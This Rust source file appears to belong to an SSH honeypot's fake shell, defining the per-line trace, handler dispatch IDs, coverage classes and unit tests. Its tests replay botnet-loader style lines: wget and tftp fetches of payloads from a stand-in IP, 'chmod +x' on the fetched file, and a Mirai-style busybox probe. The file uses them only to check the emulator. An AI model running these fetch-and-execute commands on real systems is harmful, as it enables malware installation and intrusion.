//! The internal trace: what the shell engine decided while running one input line. It is an
//! operator and test channel only. Attacker-facing bytes come solely from `CommandResult`, and no
//! constructor or fold of `CommandResult` takes a trace type, so nothing here can reach a socket;
//! `no_trace_byte_reaches_output` and `trace_type_never_feeds_wire_output` (sensor-ssh's
//! `tests/shell_test.rs`) hold that line.

use super::ControlOp;
use super::ast::UnsupportedKind;

/// Everything the engine decided while running ONE input line. Held on the shell (current line
/// only), surfaced to the operator through `tracing` and to tests through
/// `FakeShell::last_trace`.
#[derive(Debug, Clone, Default, PartialEq, Eq, serde::Serialize)]
pub struct LineTrace {
    /// The decoded (post-XOR) line. The raw pre-codec text is already on the command_exec event.
    pub decoded: String,
    pub xor_key: Option<u8>,
    /// True when `is_binary_line` suppressed per-line events (the flood path).
    pub binary_line: bool,
    /// One entry per control segment, in execution order.
    pub segments: Vec<SegmentTrace>,
    /// Whole-line budget outcome.
    pub budget: BudgetTrace,
    /// The events this line emitted, in order: a log of the events, not the events.
    pub events: Vec<TraceEventKind>,
}

#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub struct SegmentTrace {
    pub op: ControlOp,
    pub decision: RunDecision,
    /// `None` when the segment was empty or short-circuited.
    pub command: Option<CommandTrace>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
pub enum RunDecision {
    Ran,
    SkippedByAnd,
    SkippedByOr,
}

#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub struct CommandTrace {
    /// A simple command's expanded arguments, redirections not included; empty for a compound
    /// command or a command made only of redirections.
    pub tokens: Vec<String>,
    pub node: ParseNode,
    pub resolved: HandlerId,
    pub status: u8,
    pub fs_effects: Vec<FsEffect>,
    /// Everything that ran inside this command: a busybox applet or the commands of an `sh -c`
    /// script, the stages of a pipeline, the body of a compound command, a `$( )` substitution.
    /// The nesting of this Vec mirrors the call stack.
    pub reentry: Vec<CommandTrace>,
    /// Why a skipped command was outside the grammar subset.
    pub unsupported: Option<UnsupportedKind>,
}

/// The syntax-tree node kinds the engine distinguishes.
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
pub enum ParseNode {
    Simple,
    /// A command made only of redirections or assignments (`>/tmp/x`).
    RedirectionOnly,
    /// A pipeline of more than one stage, or one negated with `!`; its stages are `reentry`.
    Pipeline,
    Subshell,
    Brace,
    If,
    For,
    While,
    Case,
    /// `name() { ... }`: storing the function; its body runs when it is called.
    FunctionDef,
    /// A construct outside the grammar subset, skipped with status 0.
    Unsupported,
}

/// The dispatch decision, one variant per behavioural arm of `FakeShell::dispatch`. Argument
/// guards (`echo $0`, `enable` under bash, a slashed path token) are distinct variants, so the
/// variant fully determines the arm.
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
pub enum HandlerId {
    Uname,
    Id,
    Whoami,
    Pwd,
    Echo,
    /// `printf`: the format interpreter loaders use to emit payloads and bytes.
    Printf,
    Cat,
    /// `head`, `hexdump` and `more`: the byte readers next to `cat`.
    Head,
    /// `tail`: the mirror of `head`, over the same bounded read.
    Tail,
    Hexdump,
    More,
    Dd,
    /// `tr`: translate/delete/squeeze over standard input, toybox's on the Android shell and GNU
    /// coreutils' on the Ubuntu one.
    Tr,
    Readlink,
    /// `realpath`: the canonical path, through the same resolver as `readlink -f`.
    Realpath,
    /// `basename` and `dirname`: lexical path splitting, no filesystem access.
    Basename,
    Dirname,
    /// `wc`, `grep` and `od`: the text tools that report on a file's bytes.
    Wc,
    Grep,
    Od,
    /// `cut`, `tee` and `awk`: the field, copy and scripting tools a survey pipes through.
    Cut,
    Tee,
    Awk,
    /// `xxd` and `strings`: the hex dumper and the printable-run extractor over modeled bytes.
    Xxd,
    Strings,
    /// `base64`: bounded encode and decode over modeled bytes, for staged payloads.
    Base64,
    /// `md5sum`, `sha1sum`, `sha256sum` and `cksum`: digests of modeled bytes, for verify steps.
    Md5sum,
    Sha1sum,
    Sha256sum,
    Cksum,
    Ls,
    Mount,
    EnableBuiltin,
    EnableNotFound,
    TrueColon,
    False,
    /// `test` and `[`.
    Test,
    Wget,
    Curl,
    Ping,
    ShellSpawn,
    Busybox,
    /// `tftp` and `ftpget`, which exist only as BusyBox applets.
    Fetcher,
    Chmod,
    Cp,
    Rm,
    Mkdir,
    /// `touch`, `mv`, `ln` and `rmdir`: the other overlay mutators, next to `cp`, `rm` and `mkdir`.
    Touch,
    Mv,
    Ln,
    Rmdir,
    /// `chattr`: ext2 attribute bits stored on the overlay's nodes.
    Chattr,
    /// `getprop` and `setprop`: the Android shell's property table and its session overlay.
    Getprop,
    Setprop,
    /// `toybox` and `toolbox`: the Android shell's multi-call binaries, routing to modeled applets.
    Toybox,
    Toolbox,
    /// The Android system commands attackers probe with: canned or intent-echoing replies only.
    Getenforce,
    Pm,
    Am,
    Wm,
    Dumpsys,
    Screencap,
    Logcat,
    /// `hostname`, `arch`, `nproc`, `date` and `uptime`: persona constants and the session clock.
    Hostname,
    Arch,
    Nproc,
    Date,
    Uptime,
    /// `free`, `df` and `du`: figures read from the modeled `/proc/meminfo`, mount table and tree.
    Free,
    Df,
    Du,
    /// `stat` and `find`: metadata and a bounded walk of the modeled tree.
    Stat,
    Find,
    /// `env` and `printenv`: the session's exported variables, sorted, and `env`'s scoped command.
    Env,
    Printenv,
    /// `ps` and `top`, `pgrep` and `pidof`, and `kill`, `killall` and `pkill`: the modeled process
    /// table, read and "signaled" without anything being touched.
    Ps,
    Top,
    Pgrep,
    Pidof,
    Kill,
    Killall,
    Pkill,
    /// `ip`, `ss`, `ifconfig`, `netstat` and `route`: the one synthetic network model, rendered.
    Ip,
    Ss,
    Ifconfig,
    Netstat,
    Route,
    /// `getent`, `nslookup` and `dig`: static answers over the modeled `/etc` files, no resolver.
    Getent,
    Nslookup,
    Dig,
    /// `nc`: intent capture. Never connects, listens or runs the `-e` command.
    Nc,
    /// The `ssh` client: version, usage and a connect that never leaves the box.
    Ssh,
    /// `systemctl` and `crontab`: the modeled units and the session's crontab file.
    Systemctl,
    Crontab,
    /// `who` and `w`: the session's own login, from the process table.
    Who,
    W,
    /// `dpkg`, `apt` and `apt-get`: the one modeled package database.
    Dpkg,
    Apt,
    /// `lspci` and `lshw`: the modeled Xen guest's devices.
    Lspci,
    Lshw,
    Sleep,
    Cd,
    Su,
    Exit,
    Logout,
    /// bash's `history`: the interactive login shell's typed lines.
    History,
    Read,
    Export,
    Unset,
    Set,
    Shift,
    Umask,
    Break,
    Continue,
    /// `return` and `local`: the builtins a function's body uses on its own scope.
    Return,
    Local,
    /// bash's `builtin NAME`: runs the shell builtin, skipping a function of that name.
    BuiltinBuiltin,
    /// A function the session defined, called by name; its commands are the call's `reentry`.
    ShellFunction,
    /// `.`, `source` and `eval`: recorded, never run.
    SourceEval,
    /// `alias` and `unalias`: the table the lexer expands from.
    Alias,
    /// bash's `shopt`: option settings, of which `expand_aliases` changes what the lexer does.
    Shopt,
    /// `trap`: handlers kept and listed, the `EXIT` one run when the shell ends.
    Trap,
    /// `exec`: redirections of the shell itself, or the command that replaces it.
    Exec,
    /// `times`: the CPU time the shell and its children used.
    Times,
    /// The `command` builtin: `-v`/`-V` describe a name, anything else runs it.
    CommandBuiltin,
    Type,
    Which,
    /// A compound command or a pipeline: no handler, the engine evaluates the node itself.
    Compound,
    PathInvoke,
    NotFound,
    /// What `dispatch` does with an empty argv. The trace labels a redirection-only command
    /// `RedirectionOnly` instead, so this is the decision, not what `CommandTrace::resolved`
    /// carries for `>/tmp/x`.
    Empty,
    RedirectionOnly,
}

/// A filesystem effect an arm caused, recorded where the shell calls into `FakeFs`.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub enum FsEffect {
    Created { path: String, bytes: usize },
    Wrote { path: String, bytes: usize },
    Removed { path: String, existed: bool },
    MadeDir { path: String },
    MarkedExecutable { path: String },
    Denied { path: String, why: FsDenied },
}

/// `FsError`, without the payload.
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
pub enum FsDenied {
    NoSuchDirectory,
    ReadOnly,
    Exists,
    NoSuchFile,
    IsADirectory,
    NotADirectory,
    TooManyLinks,
    NoSpace,
    FileTooLarge,
    NameTooLong,
}

impl From<&crate::fakefs::FsError> for FsDenied {
    fn from(error: &crate::fakefs::FsError) -> Self {
        use crate::fakefs::FsError;
        match error {
            FsError::NoSuchDirectory(_) => Self::NoSuchDirectory,
            FsError::ReadOnly => Self::ReadOnly,
            FsError::Exists => Self::Exists,
            FsError::NoSuchFile => Self::NoSuchFile,
            FsError::IsADirectory => Self::IsADirectory,
            FsError::NotADirectory => Self::NotADirectory,
            FsError::TooManyLinks => Self::TooManyLinks,
            FsError::NoSpace => Self::NoSpace,
            FsError::FileTooLarge => Self::FileTooLarge,
            FsError::NameTooLong => Self::NameTooLong,
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
pub enum TraceEventKind {
    CommandExec,
    FileDownload,
    FloodBinary,
    FloodCommandCap,
    FloodDownloadCap,
}

/// What the line cost against the per-line and per-connection budgets.
#[derive(Debug, Clone, Default, PartialEq, Eq, serde::Serialize)]
pub struct BudgetTrace {
    /// Steps plus bytes scanned or produced, charged to the line's work budget.
    pub work_charged: u64,
    /// The deepest re-entrant dispatch the line reached.
    pub max_depth_reached: u32,
    /// The first cap the line ran into, if any. Later ones are not recorded.
    pub hit: Option<BudgetHit>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
pub enum BudgetHit {
    Work,
    Depth,
    DownloadPerLine,
    OwnedBytes,
    Nodes,
}

/// How well the fake shell handled one input line, for the operator's coverage measure. Derived
/// from the trace by [`LineTrace::classify`] and shipped as a short word on the command_exec
/// event; the trace itself never leaves the process.
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
pub enum CommandClass {
    Supported,
    Partial,
    Unknown,
    ParseLimit,
}

impl CommandClass {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Supported => "supported",
            Self::Partial => "partial",
            Self::Unknown => "unknown",
            Self::ParseLimit => "parse_limit",
        }
    }
}

impl HandlerId {
    /// Handlers that capture intent or answer with a canned reply instead of modeling the
    /// command: attacker input is recorded but the behavior is not reproduced.
    fn is_canned(self) -> bool {
        matches!(
            self,
            Self::Nc
                | Self::Wget
                | Self::Curl
                | Self::SourceEval
                | Self::Getenforce
                | Self::Pm
                | Self::Am
                | Self::Wm
                | Self::Dumpsys
                | Self::Screencap
                | Self::Logcat
        )
    }
}

impl CommandTrace {
    /// This command and everything nested in it, parents first.
    fn walk<'a>(&'a self, out: &mut Vec<&'a CommandTrace>) {
        out.push(self);
        for inner in &self.reentry {
            inner.walk(out);
        }
    }

    /// True when no handler modeled the command: an unknown name, a path that is not a file the
    /// session can run (status 127), or a multi-call binary that answered "applet not found"
    /// (status 127 with nothing run beneath it). A path that exists but cannot run (126) is a
    /// modeled outcome, not a gap, and a saved executable that ran is modeled too.
    fn is_unhandled(&self) -> bool {
        match self.resolved {
            HandlerId::NotFound | HandlerId::EnableNotFound => true,
            HandlerId::PathInvoke => self.status == 127,
            HandlerId::Busybox | HandlerId::Toybox | HandlerId::Toolbox => {
                self.status == 127 && self.reentry.is_empty()
            }
            _ => false,
        }
    }

    /// The first token that names a program: this command's, or the first nested command's when
    /// this one is a pipeline or compound command with no tokens of its own.
    fn first_program(&self) -> Option<&str> {
        self.tokens
            .first()
            .map(String::as_str)
            .or_else(|| self.reentry.iter().find_map(CommandTrace::first_program))
    }
}

impl LineTrace {
    /// The first top-level command that ran.
    pub fn primary_command(&self) -> Option<&CommandTrace> {
        self.segments.iter().find_map(|s| s.command.as_ref())
    }

    /// Resolved basename of the program the line starts with, `None` for a line with no program
    /// token (redirection-only, or nothing ran).
    pub fn primary_basename(&self) -> Option<&str> {
        self.primary_command()
            .and_then(CommandTrace::first_program)
            .map(super::command_basename)
    }

    /// Exit status of the last top-level command that ran, which is what the line reports to a
    /// following `$?`. `None` when nothing ran.
    pub fn final_status(&self) -> Option<u8> {
        self.segments
            .iter()
            .rev()
            .find_map(|s| s.command.as_ref())
            .map(|c| c.status)
    }

    /// Coverage class of the line, first match wins:
    ///
    /// 1. `ParseLimit`: a work, depth, download, owned-bytes or node cap cut the line short
    ///    (`budget.hit`), so the rest of the line was not modeled.
    /// 2. `Unknown`: any command anywhere in the line (nested commands included) had no handler:
    ///    `NotFound`, `EnableNotFound`, a `PathInvoke` that exited 127, or a multi-call binary
    ///    that answered "applet not found". A `PathInvoke` that exited otherwise (126, or a saved
    ///    executable that ran) counts as modeled.
    /// 3. `Partial`: any command was outside the grammar subset (`unsupported` set or
    ///    `ParseNode::Unsupported`), or resolved to a canned or intent-only handler: `Nc`,
    ///    `Wget`, `Curl`, `SourceEval`, `Getenforce`, `Pm`, `Am`, `Wm`, `Dumpsys`, `Screencap`,
    ///    `Logcat`.
    /// 4. `Supported`: everything else. A line with no command at all (nothing ran) also lands
    ///    here; blank lines never reach a class because they emit no event.
    pub fn classify(&self) -> CommandClass {
        if self.budget.hit.is_some() {
            return CommandClass::ParseLimit;
        }
        let mut all = Vec::new();
        for command in self.segments.iter().filter_map(|s| s.command.as_ref()) {
            command.walk(&mut all);
        }
        if all.iter().any(|c| c.is_unhandled()) {
            return CommandClass::Unknown;
        }
        if all.iter().any(|c| {
            c.unsupported.is_some() || c.node == ParseNode::Unsupported || c.resolved.is_canned()
        }) {
            return CommandClass::Partial;
        }
        CommandClass::Supported
    }
}

impl CommandTrace {
    pub(super) fn open(tokens: &[&str], node: ParseNode, resolved: HandlerId) -> Self {
        Self {
            tokens: tokens.iter().map(|t| (*t).to_string()).collect(),
            node,
            resolved,
            status: 0,
            fs_effects: Vec::new(),
            reentry: Vec::new(),
            unsupported: None,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::fakefs::FakeFs;
    use crate::shell::{EmitContext, FakeShell};

    fn ctx() -> EmitContext {
        EmitContext {
            source_ip: "203.0.113.7".parse().unwrap(),
            wan_ip: None,
            authenticated: true,
            protocol_label: "ssh".to_string(),
            session_id: None,
        }
    }

    fn shell() -> FakeShell {
        FakeShell::new(FakeFs::new(), ctx())
    }

    fn android() -> FakeShell {
        FakeShell::android(FakeFs::android(), ctx())
    }

    /// The single command a one-segment line ran.
    fn only_command(sh: &FakeShell) -> &CommandTrace {
        let trace = sh.last_trace();
        assert_eq!(trace.segments.len(), 1, "{trace:?}");
        trace.segments[0].command.as_ref().expect("segment ran")
    }

    #[test]
    fn trace_covers_the_current_line_only() {
        let mut sh = shell();
        sh.handle_input("echo first");
        sh.handle_input("echo second; echo third");
        let trace = sh.last_trace();
        assert_eq!(trace.decoded, "echo second; echo third");
        assert_eq!(trace.segments.len(), 2);
        assert_eq!(trace.events, vec![TraceEventKind::CommandExec]);
    }

    #[test]
    fn short_circuited_segments_are_recorded_without_a_command() {
        let mut sh = shell();
        sh.handle_input("false && echo x");
        let segments = &sh.last_trace().segments;
        assert_eq!(segments[0].decision, RunDecision::Ran);
        assert_eq!(segments[0].op, ControlOp::Seq);
        assert_eq!(segments[0].command.as_ref().unwrap().status, 1);
        assert_eq!(segments[1].decision, RunDecision::SkippedByAnd);
        assert_eq!(segments[1].op, ControlOp::And);
        assert!(segments[1].command.is_none());

        sh.handle_input("true || echo x");
        let segments = &sh.last_trace().segments;
        assert_eq!(segments[1].decision, RunDecision::SkippedByOr);
        assert!(segments[1].command.is_none());

        sh.handle_input("false || true");
        let segments = &sh.last_trace().segments;
        assert_eq!(segments[1].decision, RunDecision::Ran);
        assert_eq!(
            segments[1].command.as_ref().unwrap().resolved,
            HandlerId::TrueColon
        );
    }

    #[test]
    fn redirection_only_command_records_the_created_file() {
        let mut sh = shell();
        let (out, _) = sh.handle_input(">/tmp/x");
        assert!(out.is_empty());
        let command = only_command(&sh);
        assert_eq!(command.node, ParseNode::RedirectionOnly);
        assert_eq!(command.resolved, HandlerId::RedirectionOnly);
        assert_eq!(
            command.fs_effects,
            vec![FsEffect::Created {
                path: "/tmp/x".to_string(),
                bytes: 0
            }]
        );
    }

    #[test]
    fn refused_redirection_records_the_denial_and_status() {
        let mut sh = android();
        let (out, _) = sh.handle_input(">/system/x");
        assert!(out.contains("Read-only file system"));
        let command = only_command(&sh);
        assert_eq!(command.status, 1);
        assert_eq!(
            command.fs_effects,
            vec![FsEffect::Denied {
                path: "/system/x".to_string(),
                why: FsDenied::ReadOnly
            }]
        );
    }

    #[test]
    fn redirected_output_records_the_write() {
        let mut sh = shell();
        sh.handle_input("echo hi > /tmp/o");
        assert_eq!(
            only_command(&sh).fs_effects,
            vec![
                FsEffect::Created {
                    path: "/tmp/o".to_string(),
                    bytes: 0
                },
                FsEffect::Wrote {
                    path: "/tmp/o".to_string(),
                    bytes: 3
                },
            ]
        );
    }

    #[test]
    fn a_pipeline_is_traced_as_one_node_holding_every_stage() {
        let mut sh = shell();
        sh.handle_input("echo a | cat");
        let command = only_command(&sh);
        assert_eq!(command.node, ParseNode::Pipeline);
        assert_eq!(command.resolved, HandlerId::Compound);
        assert_eq!(command.reentry.len(), 2);
        assert_eq!(command.reentry[0].resolved, HandlerId::Echo);
        assert_eq!(command.reentry[0].tokens, vec!["echo", "a"]);
        assert_eq!(command.reentry[1].resolved, HandlerId::Cat);
        assert_eq!(command.status, 0);
    }

    #[test]
    fn compound_commands_record_their_nodes_and_the_commands_inside() {
        let mut sh = shell();
        sh.handle_input("if true; then echo a; fi");
        let outer = only_command(&sh);
        assert_eq!(outer.node, ParseNode::If);
        let inner: Vec<_> = outer.reentry.iter().map(|c| c.resolved).collect();
        assert_eq!(inner, vec![HandlerId::TrueColon, HandlerId::Echo]);

        sh.handle_input("for i in 1 2; do echo $i; done");
        let outer = only_command(&sh);
        assert_eq!(outer.node, ParseNode::For);
        assert_eq!(outer.reentry.len(), 2);
        assert_eq!(outer.reentry[1].tokens, vec!["echo", "2"]);

        sh.handle_input("( cd /tmp )");
        assert_eq!(only_command(&sh).node, ParseNode::Subshell);
    }

    #[test]
    fn an_unsupported_construct_is_recorded_as_skipped() {
        let mut sh = shell();
        let (out, _) = sh.handle_input("[[ -f /etc/hostname ]]");
        assert!(out.is_empty());
        let command = only_command(&sh);
        assert_eq!(command.node, ParseNode::Unsupported);
        assert_eq!(
            command.unsupported,
            Some(crate::shell::UnsupportedKind::DoubleBracket)
        );
        assert_eq!(command.status, 0);
    }

    #[test]
    fn a_loop_cannot_grow_the_trace_without_bound() {
        let mut sh = shell();
        sh.handle_input("i=0; while :; do i=$((i+1)); if :; then :; fi; done");
        let count = |c: &CommandTrace| {
            fn walk(c: &CommandTrace) -> usize {
                1 + c.reentry.iter().map(walk).sum::<usize>()
            }
            walk(c)
        };
        let total: usize = sh
            .last_trace()
            .segments
            .iter()
            .filter_map(|s| s.command.as_ref())
            .map(count)
            .sum();
        assert!(total <= 600, "{total} trace nodes for one line");
        assert_eq!(sh.last_trace().budget.hit, Some(BudgetHit::Work));
    }

    #[test]
    fn filesystem_arms_record_their_effects() {
        let mut sh = shell();
        let path = |p: &str| p.to_string();

        sh.handle_input("mkdir /tmp/d");
        assert_eq!(
            only_command(&sh).fs_effects,
            vec![FsEffect::MadeDir {
                path: path("/tmp/d")
            }]
        );
        sh.handle_input("mkdir /tmp/d");
        assert_eq!(
            only_command(&sh).fs_effects,
            vec![FsEffect::Denied {
                path: path("/tmp/d"),
                why: FsDenied::Exists
            }]
        );

        sh.handle_input("wget -q http://203.0.113.9/p.bin");
        assert_eq!(
            only_command(&sh).fs_effects,
            vec![FsEffect::Wrote {
                path: path("/root/p.bin"),
                bytes: crate::shell::FETCHED_BODY.len()
            }]
        );

        sh.handle_input("chmod +x /root/p.bin");
        assert_eq!(
            only_command(&sh).fs_effects,
            vec![FsEffect::MarkedExecutable {
                path: path("/root/p.bin")
            }]
        );

        sh.handle_input("cp /root/p.bin /tmp/q");
        assert_eq!(
            only_command(&sh).fs_effects,
            vec![FsEffect::Wrote {
                path: path("/tmp/q"),
                bytes: crate::shell::FETCHED_BODY.len()
            }]
        );

        sh.handle_input("rm /tmp/q");
        assert_eq!(
            only_command(&sh).fs_effects,
            vec![FsEffect::Removed {
                path: path("/tmp/q"),
                existed: true
            }]
        );
        sh.handle_input("rm -f /tmp/q");
        assert_eq!(
            only_command(&sh).fs_effects,
            vec![FsEffect::Removed {
                path: path("/tmp/q"),
                existed: false
            }]
        );
    }

    #[test]
    fn every_dispatch_arm_resolves_to_its_own_handler() {
        let linux: &[(&str, HandlerId)] = &[
            ("uname -a", HandlerId::Uname),
            ("id", HandlerId::Id),
            ("whoami", HandlerId::Whoami),
            ("pwd", HandlerId::Pwd),
            ("echo hi", HandlerId::Echo),
            ("cat /etc/hostname", HandlerId::Cat),
            ("head -n 1 /etc/hostname", HandlerId::Head),
            ("tail -n 1 /etc/hostname", HandlerId::Tail),
            ("more /etc/hostname", HandlerId::More),
            ("dd if=/etc/hostname", HandlerId::Dd),
            ("readlink /bin", HandlerId::Readlink),
            ("realpath /bin", HandlerId::Realpath),
            ("basename /bin/ls", HandlerId::Basename),
            ("dirname /bin/ls", HandlerId::Dirname),
            ("wc -c /etc/hostname", HandlerId::Wc),
            ("grep -F a /etc/hostname", HandlerId::Grep),
            ("od -An -tx1 /etc/hostname", HandlerId::Od),
            ("command -v ls", HandlerId::CommandBuiltin),
            ("type ls", HandlerId::Type),
            ("which ls", HandlerId::Which),
            ("ls /", HandlerId::Ls),
            ("mount", HandlerId::Mount),
            ("enable", HandlerId::EnableBuiltin),
            ("true", HandlerId::TrueColon),
            (":", HandlerId::TrueColon),
            ("false", HandlerId::False),
            ("test -e /", HandlerId::Test),
            ("[ -e / ]", HandlerId::Test),
            ("wget -q http://203.0.113.9/x", HandlerId::Wget),
            ("curl http://203.0.113.9/x", HandlerId::Curl),
            ("ping -c1 203.0.113.9", HandlerId::Ping),
            ("sh", HandlerId::ShellSpawn),
            ("/bin/bash", HandlerId::ShellSpawn),
            ("/bin/busybox X", HandlerId::Busybox),
            ("chmod 777 /tmp", HandlerId::Chmod),
            ("cp /etc/hostname /tmp/h", HandlerId::Cp),
            ("rm -f /tmp/zz", HandlerId::Rm),
            ("mkdir /tmp/m", HandlerId::Mkdir),
            ("touch /tmp/t", HandlerId::Touch),
            ("mv /tmp/none /tmp/m", HandlerId::Mv),
            ("ln -s /tmp/a /tmp/l", HandlerId::Ln),
            ("rmdir /tmp/none", HandlerId::Rmdir),
            ("chattr +i /tmp", HandlerId::Chattr),
            ("sleep 1", HandlerId::Sleep),
            ("cd /tmp", HandlerId::Cd),
            ("su", HandlerId::Su),
            ("exit", HandlerId::Exit),
            ("logout", HandlerId::Logout),
            ("/tmp/none", HandlerId::PathInvoke),
            ("nosuchcmd", HandlerId::NotFound),
            (">/tmp/x", HandlerId::RedirectionOnly),
        ];
        for (line, want) in linux {
            let mut sh = shell();
            sh.handle_input(line);
            assert_eq!(only_command(&sh).resolved, *want, "{line}");
        }

        // Absent as files on Ubuntu, so they dispatch only as BusyBox applets.
        for (line, want) in [
            ("busybox hexdump -C /etc/hostname", HandlerId::Hexdump),
            ("busybox xxd /etc/hostname", HandlerId::Xxd),
            ("busybox strings /etc/hostname", HandlerId::Strings),
            ("busybox ash", HandlerId::ShellSpawn),
            ("busybox tftp -g -r f 203.0.113.9", HandlerId::Fetcher),
            ("busybox ftpget 203.0.113.9 f", HandlerId::Fetcher),
        ] {
            let mut sh = shell();
            sh.handle_input(line);
            let outer = only_command(&sh);
            assert_eq!(outer.resolved, HandlerId::Busybox, "{line}");
            assert_eq!(outer.reentry[0].resolved, want, "{line}");
        }

        // `enable` outside bash is not a builtin.
        let mut sh = android();
        sh.handle_input("enable");
        assert_eq!(only_command(&sh).resolved, HandlerId::EnableNotFound);

        // The empty-argv decision itself, which the trace relabels for redirections.
        assert_eq!(shell().resolve_handler(&[]), HandlerId::Empty);
    }

    #[test]
    fn reentrant_dispatch_nests_under_its_caller() {
        let mut sh = shell();
        sh.handle_input("/bin/busybox echo hi");
        let outer = only_command(&sh);
        assert_eq!(outer.resolved, HandlerId::Busybox);
        assert_eq!(outer.reentry.len(), 1);
        assert_eq!(outer.reentry[0].resolved, HandlerId::Echo);
        assert_eq!(outer.reentry[0].tokens, vec!["echo", "hi"]);

        sh.handle_input("busybox sh -c \"id\"");
        let outer = only_command(&sh);
        assert_eq!(outer.reentry[0].resolved, HandlerId::ShellSpawn);
        assert_eq!(outer.reentry[0].reentry[0].resolved, HandlerId::Id);

        sh.handle_input("busybox NOSUCH");
        assert!(only_command(&sh).reentry.is_empty());
    }

    #[test]
    fn events_are_logged_in_emission_order() {
        let mut sh = shell();
        sh.handle_input("wget http://203.0.113.9/a.sh");
        assert_eq!(
            sh.last_trace().events,
            vec![TraceEventKind::CommandExec, TraceEventKind::FileDownload]
        );

        let mut sh = shell();
        sh.handle_input("\u{1}\u{2}\u{3}\u{4}\u{5}");
        assert!(sh.last_trace().binary_line);
        assert_eq!(sh.last_trace().events, vec![TraceEventKind::FloodBinary]);
        sh.handle_input("\u{1}\u{2}\u{3}\u{4}\u{5}");
        assert!(sh.last_trace().events.is_empty(), "the marker is one-shot");

        let mut sh = shell();
        for _ in 0..256 {
            sh.handle_input("true");
        }
        sh.handle_input("true");
        assert_eq!(
            sh.last_trace().events,
            vec![TraceEventKind::FloodCommandCap]
        );
        sh.handle_input("true");
        assert!(sh.last_trace().events.is_empty());
    }

    #[test]
    fn no_trace_byte_reaches_output() {
        let vocabulary = [
            "Busybox",
            "NotFound",
            "PathInvoke",
            "RedirectionOnly",
            "ShellSpawn",
            "TrueColon",
            "SkippedByAnd",
            "SkippedByOr",
            "RunDecision",
            "Created",
            "Wrote",
            "MadeDir",
            "Denied",
            "NoSpace",
            "ReadOnly",
            "FileDownload",
            "FloodBinary",
            "CommandExec",
            "resolved",
            "fs_effects",
            "reentry",
            "work_charged",
            "BudgetHit",
            "segments",
        ];
        let lines = [
            "false && echo skipped || echo done",
            ">/tmp/x",
            "/bin/busybox MIRAI",
            "sh -c \"id\"",
            "busybox sh -c \"id\"",
            "wget http://203.0.113.9/a.sh",
            "cp /nonexistent /tmp/y",
            "\u{1}\u{2}\u{3}\u{4}\u{5}",
        ];
        let mut sh = shell();
        for line in lines {
            let (out, events) = sh.handle_input(line);
            let text = String::from_utf8_lossy(out.bytes()).into_owned();
            let event_text = format!("{events:?}");
            for token in vocabulary {
                assert!(!text.contains(token), "{line:?} leaked {token:?}: {text:?}");
                assert!(
                    !out.bytes()
                        .windows(token.len())
                        .any(|w| w == token.as_bytes()),
                    "{line:?} leaked {token:?}"
                );
                assert!(
                    !event_text.contains(token),
                    "{line:?} event leaked {token:?}"
                );
            }
        }

        // Positive control: the reply is there and the trace is populated, in the same run.
        let mut sh = shell();
        let (out, _) = sh.handle_input("false && echo skipped || echo done");
        assert!(out.ends_with("done\n"));
        assert_eq!(
            sh.last_trace().segments[1].decision,
            RunDecision::SkippedByAnd
        );
        let (out, _) = sh.handle_input(">/tmp/x");
        assert!(out.is_empty());
        assert!(matches!(
            only_command(&sh).fs_effects.as_slice(),
            [FsEffect::Created { .. }]
        ));
    }
}
